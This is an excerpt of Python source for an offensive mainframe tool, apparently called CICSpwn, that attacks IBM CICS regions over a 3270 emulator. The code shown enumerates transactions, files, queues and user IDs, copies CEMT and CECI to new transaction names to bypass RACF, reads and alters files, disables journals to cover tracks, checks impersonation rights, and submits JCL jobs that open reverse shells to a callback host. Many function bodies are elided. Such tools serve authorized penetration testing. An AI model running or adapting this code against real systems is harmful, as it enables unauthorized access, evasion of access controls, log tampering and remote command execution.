...
import py3270
from py3270 import Emulator, CommandError, FieldTruncateError, TerminatedError, WaitError, KeyboardStateError, \
    FieldTruncateError, X3270App, S3270App
...
CECI = b"CECI"
CEMT = b"CEMT"
CAT3_TRANS = [b"CSRK", b"CSRS", b"CSAC", b"CQPO", b"CQRY", b"CPSS"]
...
class EmulatorIntermediate(Emulator):
    ...
    def screen_get(self):
        """ gets the content of the screen
        :return: byte-like """
...
def whine(text, kind='clear', level=0):
  ...
  """
    ...
    color = ''
    if kind == 'warn':
        typdisp = '[!] ';color = bcolors.YELLOW
    elif kind == 'info':
        typdisp = '[+] ';color = bcolors.WHITE
    elif kind == 'err':
        typdisp = '[#] ';color = bcolors.RED
    elif kind == 'good':
        typdisp = '[*] ';color = bcolors.GREEN
    if level == 1:
        lvldisp = "\t"
    elif level == 2:
        lvldisp = "\t\t"
...
def connect_zOS(target, secure=False):
    """
    Connects to z/OS server.
    Uses a flag to use SSL/TLS instead of port number to instructs 3270 to use SSL
    """
...
def check_valid_applid(applid, do_authent, method=1, custom_cics=False):
    ...
    if do_authent:
        ...
        data = em.screen_get()
        for d in data:
            if b"Password " in d or b'PASSWORD ' in d or b"Code " in d or b"passe " in d or b'Logon ' in d:
                break
            else:
                pos_pass += 1
            if pos_pass > 23:
                whine("Could not find a password field. Was looking for \"password\", \"code\" or \"pass\" strings",
                      'err')
                for d in data:
                    print(d)
                sys.exit()
    ...
    if em.find_response(b'DFHAC2001'):
...
def get_hql_files():
    ...
    em.safe_send(format_request(CEMT + b" I DSNAME"))
    em.send_enter()
...
def get_version():
    ...
    """
    version = query_cics_scrap(CEMT + b" I SYS", b"Cicstslevel(", 8, 0, 0)
    if version:
...
def get_os_version():
    ...
    """
    version = query_cics_scrap(CEMT + b" I SYS", b"Oslevel(", 6, 0, 0)
    if version:
        version = version[1:4]
        # version = version.strip("0").replace("0",".")
...
def get_default_user():
    ...
    """
    default_user = query_cics_scrap(CEMT + b" I SYS", b"Dfltuser(", 8, 0, 0)
    return default_user
...
def get_max_tasks():
    ...
    """
    default_user = query_cics_scrap(CEMT + b" I SYS", b"Maxtasks( ", 4, 0, 0)
    return default_user
...
def activate_supplied(old_name, old_group, new_name, new_group):
    ...
    if b"already exists" in data[20]:
        whine("Already copied " + old_name.upper() + " to " + new_name.upper() + " in group " + old_group.upper(),
              "info", 1)


    elif not b"COPY SUCCESSFUL" in data[22]:
        whine(
            'Could not copy ' + old_name.upper() + ' to a new transaction name ' + new_name.upper() + ' in group ' + new_group.upper(),
            'err', 1)
        whine(data[22], 'err')
        return False
    else:
...
def bypass_racf():
    ...
    global CEMT
    global CECI
    if query_cics(b'CEDA', b'ALter', 5):
        em.send_pf3()
        whine("Bypass of RACF is possible and will be carried out", 'good', 1)

    if query_cics(b'CSPS', b'Inquire', 5):
        is_cemt = True
        em.send_pf3()
        CEMT = "CSPS"
        whine("CSPS points to CEMT now. Please use --cemt=CSPS in future commands or keep the --bypass switch", 'good',
              1)

    elif not is_cemt and activate_supplied("CEMT", "DFHCOMP3", "CSPS", "DDDD") and query_cics(CEMT, b'Inquire', 5):
        em.send_pf3()
        is_cemt = True
        whine("CEMT is available under the transaction name CSPS. Please specify --cemt=CSPS in every future command",
              'good', 1)
    else:
        whine('Could not copy CEMT to new transaction', 'err', 1);

    if query_cics(b'CSPK', b'ACquire', 5):
        is_ceci = True
        em.send_pf3()
        CECI = "CSPK"
        whine("CSPK points to CECI now. Please use --ceci=CSPK in future commands or keep the --bypass switch", 'good',
              1)

    elif not is_ceci and activate_supplied("CECI", "DFHCOMP1", "CSPK", "BBBB") and query_cics(CECI, b'ACquire', 5):
        em.send_pf3()
        is_ceci = True
        whine(
            "CECI is now available under the transaction name CSPK. Please specify --ceci=CSPK in every future command",
            'good', 1)
    else:
...
def get_infos():
    ...
    if query_cics(CEMT, [b'Inquire'], 5):
        is_cemt = True
        em.send_pf3()
        whine("CEMT", 'good', 1)
    ...
    if query_cics(CECI, [b'ACquire', b'DELETEQ'], 5):
        is_ceci = True
        em.send_pf3()
        whine("CECI", 'good', 1)

    if query_cics(b'CECS', [b'ACquire', b'DELETEQ'], 5):
        is_cecs = True
        em.send_pf3()
        whine("CECS", 'good', 1)

    if query_cics(b'CEDF ,OFF', [b'EDF MODE OFF'], 1):
        is_cedf = True
        em.send_pf3()
        whine("CEDF", 'good', 1)

    if query_cics(b'CEBR', [b'ENTER COMMAND'], 2):
        is_cebr = True
        em.send_pf3()
        whine("CEBR", 'good', 1)
    ...
    if is_ceda and (not is_ceci or not is_cemt) and (not results.bypass):
        ...
        if response.upper() != "N":
            if not is_ceci and activate_supplied("CECI", "DFHCOMP1", "CSPK", "BBBB") and query_cics(CECI, b'ACquire', 5):
                em.send_pf3()
                is_ceci = True
                whine(
                    "CECI is now available under the transaction name CSPK. Please specify --ceci=CSPK in every future command",
            ...
            if not is_cemt and activate_supplied("CEMT", "DFHCOMP3", "CSPS", "DDDD") and query_cics(CEMT, b'Inquire', 5):
                em.send_pf3()
                is_cemt = True
                whine(
                    "CEMT is available under the transaction name CSPS. Please specify --cemt=CSPS in every future command",
                    'good', 1)
    ...
    if is_cemt:
        tdqueue = query_cics_scrap(CEMT + b' INQUIRE TDQueue DDN (INREADER)', b'Tdq(', 4, 0, 0)
        tdqueue2 = query_cics_scrap(CEMT + b' INQUIRE TDQueue DDN (INTRDR)', b'Tdq(', 4, 0, 0)
    ...
    if (tdqueue or tdqueue2) and (tdqueue != "*" or tdqueue2 != "*") and is_ceci:
        ...
        whine('When submitting a job with TDQueue, provide the option --queue=' + (
            tdqueue.strip('\n') if tdqueue else tdqueue2.strip('\n')), 'good', 2)

    if is_ceci:
        spool = send_cics(CECI + b' SpoolOpen OUTPUT USERID(INTRDR  ) NODE(LOCAL   )', True)
    ...
    if query_cics(b'CESN', b'Signon to CICS', 1):
...
def get_transactions(transid):
    """
        ...
        :param: byte-like string
     """
    em.send_clear()
    em.move_to(1, 2)

    print("ID\tPROGRAM")
    em.safe_send(CEMT + b' Inquire Trans(' + transid + b') en                                           ')
    em.send_enter()
...
def get_files(filename):
    ...
    em.safe_send(format_request(CEMT + b' Inquire File(' + filename + b')'))
    em.send_enter()
    ...
    while (more == True and number_files < TRAN_NUMBER):
        ...
        for d in data:
            if b"Fil(" in d and b"NOT FOUND" not in d:
                ...
                out = file_name + b"\t" + file_type + b"\t" + file_status + b"\t" + file_access_read + b"\t" + file_access_update + b"\t" + file_dsp
            elif b"Dsn(" in d:
                file_dsn = d[15:60]
                out = b"\t" + file_dsn
            print(out)
...
def add_content_tsq(tsq_name, item, content_file):
    ...
    if not f:
        whine("Could not open file " + content_file, 'err')
        sys.exit()
...
def handle_tsq_content(tsqueue, kind="read"):
    ...
    em.send_enter()
    data = em.screen_get()
    if b"NOT AUTHORIZED" in data[2] or "DFHAC2002" in data[22]:
...
def fetch_content(filename, ridfld, keylength):
    ...
    if b"STATUS:  SESSION ENDED" in data[1]:  # ça va planter
        req_read = CECI + b' READ FI(' + filename.upper() + b') RI(' + str(ridfld) + b') GTE INTO(&FI)'
    else:
        req_read = b' READ FI(' + filename.upper() + b') RI(' + str(ridfld) + b') GTE INTO(&FI)'
...
def change_file_attributes(filename, attr):
    ...
    elif b"NOT AUTHORIZED" in data[2] or "DFHAC2002" in data[22]:
...
def handle_file_content(filename, kind="read"):
    ...
    if b"NOT AUTHORIZED" in data[2] or b"DFHAC2002" in data[22]:
        whine(
            "Cannot access CEMT to get get key and record length (defaults will be used rsize=80, klen=6), try --bypass switch to bypass RACF",
            'err')
    else:
        ...
        if keylength != 0 and recordsize != 0:
            ...
            whine("Could not get record size and keylength size, default values will be used (rsize = 80, klen=6)",
                  'err')
            keylength = 6
            recordsize = 80
...
def open_spool():
    ...
    data = em.screen_get()
    if b"DFHAC2002" in data[22] and "CECI" in data[22]:
...
def submit_job(kind, lhost="192.168.1.28:4444"):
    ...
    if results.jcl and kind == "custom":
        ...
        whine(
            'Submit parameter must be one of the following: direct_unix, direct_tso, reverse_tso, reverse_unix, reverse_rexx, direct_rexx, ftp, custom, dummy',
            'err')
        sys.exit()
    ...
    if kind == "reverse_rexx":
        ...
        remote_ip = input(
            bcolors.YELLOW + '[!] IP address of the USS segment of z/OS (try the same IP as  the host ): ' + bcolors.ENDC)
...
def disable_journal():
    ...
    data = em.screen_get()
    for d in data:
        if b"Jou(" in d and "NORMAL" in d and "Dis" in d and "DFHLOG" not in d:
            number_journals += 1
            all_journals += 1
        elif b"Jou(" in d and "NORMAL" not in d and "Ena" in d and "DFHLOG" not in d:
...
def fetch_userids():
    ...
    default_u = tcl_u = query_cics_scrap(CEMT + b" I SYS", "Dfltuser(", 8, 0, 0)
    region_id = None
    print(default_u + " (Default user)" if default_u else '')

    tcl_u = query_cics_scrap(CEMT + b" I TCL", "Installu(", 8, 0, 0)
    if not tcl_u:
        tcp_u = query_cics_scrap(CEMT + b" I TCPIPSERV", "Installusrid(", 8, 1, 1)
        print(tcp_u if tcp_u else '')
    else:
        print(tcl_u)

    con_u = query_cics_scrap(CEMT + b" I CONN", "Changeusrid(", 8, 1, 1)
    print(con_u if con_u else '')
    uri_u = query_cics_scrap(CEMT + b" I URIMAP", "Userid(", 8, 1, 1)
    print(uri_u if uri_u else '')

    db2_u = query_cics_scrap(CEMT + b" I DB2C", "Signid(", 8, 1, 1)
    print(db2_u if db2_u else '')

    pro_u = query_cics_scrap(CEMT + b" I PROFILE", "Installu(", 8, 0, 0)
    print(pro_u if pro_u else '')

    uow_u = query_cics_scrap(CEMT + b" I UOW ", "Use(", 8, 0, 0)
    if uow_u:
...
def check_surrogat(surrogat_user):
    ...
    """
    whine(
        "A JOB gets submitted with CICS Region ID, which may or may not impersonate users no matter the result of this check",
        'warn')
    variables = ["READ"]
    ...
    read = get_cics_value(
        CECI + ' QUERY SECURI RESC(SURROGAT) RESID(' + surrogat_user.upper() + '.SUBMIT) RESIDL(' + length + ') ',
        variables, True)
    read = ''.join(read)
    if read == "+0000000035":
...
def check_propagate(propagate_user):
    ...
    result = send_cics(
        CECI + ' QUERY SECURI RESC(PROPCNTL) RESID(' + propagate_user.upper() + ') RESIDL(' + length + ')', True)
...
def main(results):
    ...
    if (results.userid != None and results.password != None):
        ...
        for d in data:
            if b'Password' in d or b'PASSWORD' in d or b'Code' in d or b'Logon ' in d:
                logon_screen = True
                break
            else:
                pos_pass += 1
        if logon_screen:
            ...
            whine("Credentials provided but no logon screen found", 'warn')
            whine("Trying last resort LOGON USER/PASSWORD", "info")
            for d in data:
                print(d)
            em.safe_send('LOGON ' + results.userid + '/' + results.password)
            em.send_enter()
            whine("Tried", "info")
            data = em.screen_get()
            for d in data:
...
if __name__ == "__main__":
    ...
    parser.add_argument('-S', '--secure', help='Use SSL/TLS secure connection', default=False, action="store_true",
                        dest="secure")
    ...
    group_info.add_argument('-A', '--all', help='Gather all information about a CICS Transaction Server',
                            action='store_true', default=False, dest='all_options')
    group_info.add_argument('-i', '--info', help='Gather basic information about a CICS region', action='store_true',
                            default=False, dest='info')
    group_info.add_argument('-u', '--userids', help='Scrape userids found in different menus', action='store_true',
                            default=False, dest='userids')
    group_info.add_argument('-p', '--pattern',
                            help='Specify a pattern of a files/transaction/tsqueue to get (default is "*")',
                            default="*", dest='pattern')
    group_info.add_argument('-q', '--quiet', help='Remove Trailing and journal before performing any action',
                            action='store_true', default=False, dest='journal')
    group_info.add_argument('--ceci', help='CECI new transaction name. Result of -i option.', default="CECI",
                            dest='ceci')
    group_info.add_argument('--cemt', help='CEMT new transaction name. Result of -i option.', default="CEMT",
                            dest='cemt')
    group_info.add_argument('--bypass',
                            help='if CEDA is available, it copies CEMT and CECI to new transid which bypasses RACF',
                            action='store_true', dest='bypass')
    group_info.add_argument('-b',
                            help='if CEDA is available, it copies OLD_TRAN to NEW TRAN (-n option) to bypass RACF. if no NEW TRAN is specified, CICSpwn chooses an IBM supplied transaction always available',
                            dest='old_tran')
    group_info.add_argument('-n', help='if CEDA is available, it copies OLD_TRAN (-b) to NEW TRAN to bypass RACF',
                            dest='new_tran')
    parser.add_argument('--custom-exit', help='Custom string to type to ext to CICS terminal', dest='custom_cics',
                        default=False)

    group_trans.add_argument('-t', '--trans', help='Get all installed transactions on a CICS TS server',
                             action='store_true', default=False, dest='trans')
    group_trans.add_argument('--enable-trans', help='Enable a transaction (keyword ALL to enable every transaction) ',
                             dest='ena_trans')
    group_trans.add_argument('--check-trans', help='Checks security access to the transactions specified in <file.txt>',
                             dest='check_trans')

    group_storage.add_argument('-f', '--files', help='List all installed files a on TS CICS', action='store_true',
                               default=False, dest='files')
    group_storage.add_argument('-e', '--tsqueues', help='List all temporary storage queues on TS CICS',
                               action='store_true', default=False, dest='tsqueues')
    group_storage.add_argument('--get-file',
                               help='Get the content of a file. It attempts to change the status of the file if it\'s not enabled, opened or readable',
                               dest='filename')
    group_storage.add_argument('--get-tsq', help='Get the content of a temporary storage queue. ', dest='tsq_name')
    group_storage.add_argument('--add-record', help='Add a record (--num) to FILE. if NUM exists, updates the record',
                               dest='filename_add')
    group_storage.add_argument('--add-item', help='Add an item (--num) to TSqueue. if NUM exists, updates the item',
                               dest='tsqueue_add')
    ...
    group_trans.add_argument('--check-files', help='Checks security access to the files specified in <file.txt>',
                             dest='check_files')
    ...
    group_access.add_argument('-r',
                              help='Given the region user ID, checks wether you are allowed to use it to submit JOBs',
                              default=False, dest='propagate_user')
    group_access.add_argument('-g', help='Checks wether you can impersonate another user when submitting a job',
                              default=False, dest='surrogat_user')

    group_job.add_argument('-s', '--submit',
                           help='Submit JCL to CICS server. Specify: dummy,reverse_unix, reverse_tso, direct_unix, reverse_unix, ftp or custom (need -j option)',
                           dest='submit')
    ...
    group_job.add_argument('--node',
                           help='System node name where the JOB should be submitted (works only with Spool functions)',
                           dest='node')
    group_job.add_argument('-l', '--lhost', help='Remote server to call back to for reverse shell (host:port)',
                           dest='lhost')
    ...
    group_job.add_argument('--rexx',
                           help='Custom REXX file to execute in memory. No label or line continuation must be present in the file',
                           dest='rexx_file')
    ...
    if results.submit and results.submit not in ['direct_unix', 'direct_tso', 'reverse_tso', 'reverse_unix',
                                                 'reverse_rexx', 'direct_rexx', 'ftp', 'custom', 'dummy']:
        whine(
            'Submit parameter must be one of the following: direct_unix, direct_tso, reverse_tso, reverse_unix, reverse_rexx, direct_rexx, ftp, custom, dummy',
            'err')
        sys.exit()
    ...
    if (results.submit and (results.submit.find("reverse") > -1) and (
            results.lhost == None or len(results.lhost.split(":")) < 2)):
    ...
    connect_zOS(results.IP + ":" + results.PORT, results.secure)
